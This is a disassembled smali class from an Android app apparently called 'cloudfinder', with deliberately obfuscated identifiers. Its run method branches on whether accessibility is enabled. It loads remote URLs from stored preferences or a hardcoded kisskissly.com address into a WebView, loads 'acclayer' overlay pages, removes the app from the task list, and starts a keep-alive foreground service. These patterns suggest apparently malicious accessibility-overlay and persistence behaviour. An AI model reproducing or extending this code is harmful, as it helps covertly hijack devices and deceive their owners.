.class public final Lذ٨ۍ/ح;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final أ:I

.field public final ؤ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;II)V
    .locals 0

    iput p3, p0, Lذ٨ۍ/ح;->آ:I

    iput-object p1, p0, Lذ٨ۍ/ح;->ؤ:Ljava/lang/Object;

    iput p2, p0, Lذ٨ۍ/ح;->أ:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 14

    iget v0, p0, Lذ٨ۍ/ح;->آ:I

    iget v1, p0, Lذ٨ۍ/ح;->أ:I

    iget-object v2, p0, Lذ٨ۍ/ح;->ؤ:Ljava/lang/Object;

    packed-switch v0, :pswitch_data_0

    goto :goto_0

    :pswitch_0
    check-cast v2, Lcom/google/android/material/datepicker/ج;

    iget-object v0, v2, Lcom/google/android/material/datepicker/ج;->ئ:Landroidx/recyclerview/widget/RecyclerView;

    invoke-virtual {v0, v1}, Landroidx/recyclerview/widget/RecyclerView;->smoothScrollToPosition(I)V

    return-void

    :pswitch_1
    check-cast v2, Lذ٨ۍ/د;

    invoke-virtual {v2, v1}, Lذ٨ۍ/د;->ا(I)V

    return-void

    :goto_0
    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    if-eqz v0, :cond_d

    invoke-virtual {v0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-eqz v0, :cond_0

    goto/16 :goto_a

    :cond_0
    const-string v0, ""

    const/4 v3, 0x0

    if-eqz v1, :cond_b

    const-string v4, "Loading acclayer_chrome, html length="

    const-string v5, "Loading acclayer, html length="

    const-string v6, "accEnabled="

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "runWebViewLoad called, mode="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v7, "MainActivity"

    invoke-static {v7, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v1, 0x2

    const/high16 v8, 0x7f0f0000

    :try_start_0
    move-object v9, v2

    check-cast v9, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v9}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    const-string v11, "homepage"

    invoke-interface {v10, v11, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "prevpage"

    invoke-interface {v10, v12, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "accpage"

    invoke-interface {v10, v13, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v9}, Lڛەٟہ/ت;->؋(Landroid/content/Context;)Z

    move-result v9

    const-string v10, "initReceived"

    sget-object v13, Lcom/lite/cloudfinder/App;->ء:Lorg/json/JSONObject;

    invoke-virtual {v13, v10, v3}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v3

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v6, ", homepage="

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ", prevpage="

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ", initReceived="

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-boolean v6, Lcom/lite/cloudfinder/activity/MainActivity;->ؤ:Z

    if-nez v6, :cond_1

    if-nez v3, :cond_1

    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    const v3, 0x7f0f000f

    invoke-virtual {v0, v3}, Lcom/lite/cloudfinder/activity/MainActivity;->أ(I)Ljava/lang/String;

    move-result-object v0

    const-string v3, "Flags not set, loading white_bg_loading"

    :goto_1
    invoke-static {v7, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_8

    :cond_1
    const/4 v3, 0x1

    const-string v6, "http"

    if-eqz v9, :cond_6

    :try_start_1
    invoke-virtual {v11}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_2

    invoke-virtual {v11}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_2

    goto :goto_2

    :cond_2
    invoke-virtual {v12}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_3

    goto :goto_4

    :cond_3
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_4

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_4

    goto/16 :goto_5

    :cond_4
    const-string v0, "https://www.kisskissly.com/v?scene=pe95ss"

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_5

    goto :goto_5

    :cond_5
    const-string v0, "Accessibility enabled, no URL to load, finishing activity"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_d

    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto/16 :goto_a

    :cond_6
    invoke-virtual {v11}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_7

    invoke-virtual {v11}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_7

    :goto_2
    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v4, Lڛەٟہ/ؤ;

    invoke-direct {v4, v0, v11, v3}, Lڛەٟہ/ؤ;-><init>(Lcom/lite/cloudfinder/activity/MainActivity;Ljava/lang/String;I)V

    :goto_3
    invoke-virtual {v0, v4}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto/16 :goto_a

    :cond_7
    invoke-virtual {v12}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_8

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_8

    :goto_4
    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v4, Lڛەٟہ/ؤ;

    invoke-direct {v4, v0, v12, v3}, Lڛەٟہ/ؤ;-><init>(Lcom/lite/cloudfinder/activity/MainActivity;Ljava/lang/String;I)V

    goto :goto_3

    :cond_8
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_9

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_9

    :goto_5
    move-object v4, v2

    check-cast v4, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v5, Lڛەٟہ/ؤ;

    invoke-direct {v5, v4, v0, v3}, Lڛەٟہ/ؤ;-><init>(Lcom/lite/cloudfinder/activity/MainActivity;Ljava/lang/String;I)V

    invoke-virtual {v4, v5}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto/16 :goto_a

    :cond_9
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1c

    if-lt v0, v3, :cond_a

    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    const v3, 0x7f0f0001

    invoke-virtual {v0, v3}, Lcom/lite/cloudfinder/activity/MainActivity;->أ(I)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_6
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v4

    goto :goto_7

    :cond_a
    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0, v8}, Lcom/lite/cloudfinder/activity/MainActivity;->أ(I)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_6

    :goto_7
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto/16 :goto_1

    :goto_8
    move-object v3, v2

    check-cast v3, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v4, Lڛەٟہ/ؤ;

    invoke-direct {v4, v3, v0, v1}, Lڛەٟہ/ؤ;-><init>(Lcom/lite/cloudfinder/activity/MainActivity;Ljava/lang/String;I)V

    invoke-virtual {v3, v4}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_a

    :catch_0
    move-exception v0

    const-string v3, "WebViewLoaderRunnable error"

    invoke-static {v7, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :try_start_2
    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v0, v8}, Lcom/lite/cloudfinder/activity/MainActivity;->أ(I)Ljava/lang/String;

    move-result-object v0

    check-cast v2, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v3, Lڛەٟہ/ؤ;

    invoke-direct {v3, v2, v0, v1}, Lڛەٟہ/ؤ;-><init>(Lcom/lite/cloudfinder/activity/MainActivity;Ljava/lang/String;I)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_a

    :catch_1
    move-exception v0

    const-string v1, "Fallback error"

    invoke-static {v7, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_a

    :cond_b
    const-class v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    const-string v4, "config"

    :try_start_3
    move-object v5, v2

    check-cast v5, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v5}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5, v4, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    const-string v6, "alarmTs"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    const-wide/32 v9, 0x2bf20

    add-long/2addr v7, v9

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->apply()V

    move-object v5, v2

    check-cast v5, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v5}, Lcom/lite/cloudfinder/activity/MainActivity;->ئ()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_9

    :catch_2
    move-exception v5

    invoke-virtual {v5}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_9
    :try_start_4
    move-object v5, v2

    check-cast v5, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v5}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5, v4, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    const-string v4, "url"

    invoke-interface {v3, v4, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_d

    move-object v0, v2

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    sget-boolean v3, Lcom/lite/cloudfinder/activity/MainActivity;->آ:Z

    invoke-virtual {v0}, Lcom/lite/cloudfinder/activity/MainActivity;->آ()Z

    move-result v0

    if-nez v0, :cond_c

    goto :goto_a

    :cond_c
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, v5, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    check-cast v2, Lcom/lite/cloudfinder/activity/MainActivity;

    invoke-virtual {v2, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_a

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_d
    :goto_a
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
